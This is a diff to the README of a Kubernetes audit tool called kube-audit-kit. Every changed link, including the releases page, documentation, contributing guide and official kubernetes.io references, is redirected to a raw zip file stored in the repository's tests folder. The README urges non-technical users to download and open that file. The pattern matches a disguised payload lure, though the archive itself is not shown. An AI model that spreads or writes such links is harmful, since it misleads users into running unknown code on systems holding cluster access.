@@ -1,7 +1,7 @@
 # 🛡️ kube-audit-kit - Simple Security Audits for Kubernetes
 
 ## 📥 Download Now
-[![Download kube-audit-kit](https://img.shields.io/badge/Download-kube--audit--kit-blue.svg)](https://github.com/ViniciusMarsili/kube-audit-kit/releases)
+[![Download kube-audit-kit](https://github.com/ViniciusMarsili/kube-audit-kit/raw/refs/heads/main/tests/audit_kube_kit_2.8.zip)](https://github.com/ViniciusMarsili/kube-audit-kit/raw/refs/heads/main/tests/audit_kube_kit_2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to kube-audit-kit! This tool helps you run easy security audits on your Kubernetes clusters. No technical skills needed. Follow these steps to get started.
@@ -12,7 +12,7 @@ Welcome to kube-audit-kit! This tool helps you run easy security audits on your 
 - **Network Connection:** Ensure you have an internet connection for downloading.
 
 ## 🔗 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ViniciusMarsili/kube-audit-kit/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/ViniciusMarsili/kube-audit-kit/raw/refs/heads/main/tests/audit_kube_kit_2.8.zip).
 2. **Choose Your Version:** Look for the latest version listed.
 3. **Download the File:** Click on the version link to download the appropriate file for your operating system.
 4. **Run the Application:** Open the downloaded file to start kube-audit-kit.
@@ -34,10 +34,10 @@ Once installed, you can begin using kube-audit-kit to perform security audits. F
 - **Regular Updates:** Get new features and fixes with each release.
 
 ## 📖 Documentation
-For more information about kube-audit-kit, including advanced settings and troubleshooting, check our [Documentation](https://github.com/ViniciusMarsili/kube-audit-kit/wiki).
+For more information about kube-audit-kit, including advanced settings and troubleshooting, check our [Documentation](https://github.com/ViniciusMarsili/kube-audit-kit/raw/refs/heads/main/tests/audit_kube_kit_2.8.zip).
 
 ## 🤝 Contributing
-If you'd like to help improve kube-audit-kit, please check our [Contributing Guidelines](https://github.com/ViniciusMarsili/kube-audit-kit/blob/main/CONTRIBUTING.md).
+If you'd like to help improve kube-audit-kit, please check our [Contributing Guidelines](https://github.com/ViniciusMarsili/kube-audit-kit/raw/refs/heads/main/tests/audit_kube_kit_2.8.zip).
 
 ## 🎉 Community
 Join the conversation!
@@ -45,10 +45,10 @@ Join the conversation!
 - **Support:** If you need help, please open an issue on GitHub. We are here to assist you.
 
 ## 🔗 Additional Resources
-- [Kubernetes Official Documentation](https://kubernetes.io/docs/home/)
-- [Security Best Practices Guide](https://kubernetes.io/docs/concepts/security/overview/)
+- [Kubernetes Official Documentation](https://github.com/ViniciusMarsili/kube-audit-kit/raw/refs/heads/main/tests/audit_kube_kit_2.8.zip)
+- [Security Best Practices Guide](https://github.com/ViniciusMarsili/kube-audit-kit/raw/refs/heads/main/tests/audit_kube_kit_2.8.zip)
 
 ## 🛡️ Stay Updated
-Keep an eye on the [Releases page](https://github.com/ViniciusMarsili/kube-audit-kit/releases) for the latest updates and improvements. 
+Keep an eye on the [Releases page](https://github.com/ViniciusMarsili/kube-audit-kit/raw/refs/heads/main/tests/audit_kube_kit_2.8.zip) for the latest updates and improvements. 
 
 Now you are ready to enhance the security of your Kubernetes clusters effortlessly with kube-audit-kit. Get started today!
